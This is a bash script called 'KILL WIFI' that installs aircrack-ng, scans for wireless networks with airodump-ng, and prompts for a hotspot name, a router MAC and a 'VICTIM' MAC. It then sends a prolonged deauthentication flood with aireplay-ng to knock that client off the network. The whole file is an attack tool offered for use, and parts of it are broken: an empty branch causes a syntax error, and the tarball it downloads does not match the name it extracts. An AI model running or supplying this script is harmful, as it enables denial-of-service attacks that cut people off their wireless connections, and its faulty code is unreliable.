#!/bin/bash

#colors

GREEN='\033[1;32m'
RED='\033[1;31m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'




echo -e "${BLUE}
 _  _____ _     _      __        _____ _____ ___ 
| |/ /_ _| |   | |     \ \      / /_ _|  ___|_ _|
| ' / | || |   | |      \ \ /\ / / | || |_   | | 
| . \ | || |___| |___    \ V  V /  | ||  _|  | | 
|_|\_\___|_____|_____|    \_/\_/  |___|_|   |___|
"

#check that user must be root

if [ "$EUID" -eq 0 ]
then    
		SECS=$((1 * 5))
		while [ $SECS -gt 0 ]; do
		   echo -ne "${RED}Checking dependency... $SECS\033[0K\r"
		   sleep 1
		   : $((SECS--))
		done
else
	echo "${RED}You don't have root permissions"
	exit 1
fi

#dependency check if not install packages 

if [ -e /usr/bin/aircrack-ng ]
then 
    echo -e "${PURPLE}Required packages are already installed skipping installation process"
else
    echo -e "${RED}Installing dependency"
	sleep 1
	DIST_VER="$(cat /proc/version)"
	DEBIAN="debian"
	UBUNTU="ubuntu"
	CENTOS="centos"
	REDHAT="red"
	echo $DIST_VER

	if [[ $DIST_VER =~ $UBUNTU || $DIST_VER =~ $DEBIAN ]] #for debian/ubuntu/mint
	then
		    echo -e "${PURPLE}Found Ubuntu/Debian/mint Installing packages accordingly"
            sleep 2
		     apt-get install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev libsqlite3-dev libpcre3-dev ethtool shtool rfkill zlib1g-dev libpcap-dev
		     apt install -y aircrack-ng 
	elif  [[ $DIST_VER =~ $CENTOS || $DIST_VER =~ $REDHAT ]]			#for fedora/centos/rhel
    then 
           echo -e "${PURPLE}Found Centos/RHEL/FEDORA Installing packages accordingly"
            sleep 2
        yum install libtool pkgconfig sqlite-devel autoconf automake openssl-devel libpcap-devel pcre-devel rfkill libnl3-devel gcc gcc-c++ ethtool
		    OS_ARCH=`uname -m`
            if [ ${OS_ARCH} == 'x86_64' ]; then
              # 64-bit stuff here
            wget ftp://ftp.icm.edu.pl/vol/rzm3/linux-dag/redhat/el5/en/x86_64/dag/RPMS/aircrack-ng-0.9.3-1.el5.rf.x86_64.rpm
            rpm -ivh aircrack-ng-0.9.3-1.el5.rf.x86_64.rpm
            else
            wget ftp://ftp.icm.edu.pl/vol/rzm6/linux-dag/redhat/el5/en/i386/dag/RPMS/aircrack-ng-0.9.3-1.el5.rf.i386.rpm
            rpm -ivh aircrack-ng-0.9.3-1.el5.rf.i386.rpm
            fi
    else
            echo -e "${PURPLE} unable to detect distribution running default installation"
            sleep 2
            wget http://download.aircrack-ng.org/aircrack-ng-1.2.tar.gz
            tar -zxvf aircrack-ng-1.0.tar.gz
            cd aircrack-ng-1.0
            make
            make install
	fi
    
    if [ "$?" -eq 0 ]
    then 
        echo -e "${BLUE}Packages Successfully installed \n"
        sleep 3
    else 
        echo "Unable to install required packages"
        SECS=$((1 * 5))
		while [ $SECS -gt 0 ]; do
		   echo -ne "${RED}Exiting... $SECS\033[0K\r"
		   sleep 1
		   : $((SECS--))
		done  
        exit 2
    fi

fi

if [ -f /etc/redhat-release ] ; then
DIST_DET="$(cat /etc/redhat-release)"
elif [ -f /etc/SuSE-release ] ; then
DIST_DET="$(cat /etc/SuSE-release)"
elif [ -f /etc/mandrake-release ] ; then
DIST_DET="$(cat /etc/mandrake-release)"
elif [ -f /etc/debian_version ] ; then
DIST_DET="$(cat /etc/lsb-release)"
fi
#displaying linux version 

#DIST_DET="$(cat /etc/*release)"
DIST_DET1="$(cat /proc/version)"
#DIST_DET2="$(cat /etc/issue)"
sleep 2
echo -e "${CYAN}\n${DIST_DET}\n\n${DIST_DET1}\n"
sleep 2
#displaying all wlan cards available

AVAIL_WLAN_CARD="$(ifconfig | cut -c1-8 | sort -u | grep w)"
echo -e "${RED}Available wlan cards :  \n\n  ${AVAIL_WLAN_CARD} \n\nChoose wlan card from above options \n${BLUE}"

#scanning medium

read -p "Enter Wireless card info (eg: wlan0): " WLAN_CARD
echo -e "${BLUE}Press ctl+c to stop scanning "
        SECS=$((1 * 5))
		while [ $SECS -gt 0 ]; do
		   echo -ne "Starting scan in : $SECS\033[0K\r"
		   sleep 1
		   : $((SECS--))
		done
SCAN= airodump-ng ${WLAN_CARD}

if [ "$?" -eq 0 ]
    then 
        
    else 
        echo "Unable to Scan"
        SECS=$((1 * 5))
		while [ $SECS -gt 0 ]; do
		   echo -ne "${RED}Exiting... $SECS\033[0K\r"
		   sleep 1
		   : $((SECS--))
		done  
        exit 3
    fi

#start attacking
echo -e "${RED}Scan is completed \nPlease try connecting to wifi before proceeding \n(if password is unknown then try with fake password just to match channels)"
sleep 15
echo -e "${BLUE}"
read -p "Enter name of the WIFI HOTSPOT: " WIFI_NAME
read -p "Enter MAC ADDR of ROUTER/WIFI : " ROUTER_MAC_ADDR
read -p "Enter MAC ADDR of VICTIM: " VICTIM_MAC_ADDR


echo -e "${RED}Press Clt+c to stop attack"
echo -e "${BLUE}"
aireplay-ng --deauth 9999 -e ${WIFI_NAME} -a ${ROUTER_MAC_ADDR} -c ${VICTIM_MAC_ADDR}  ${WLAN_CARD} 
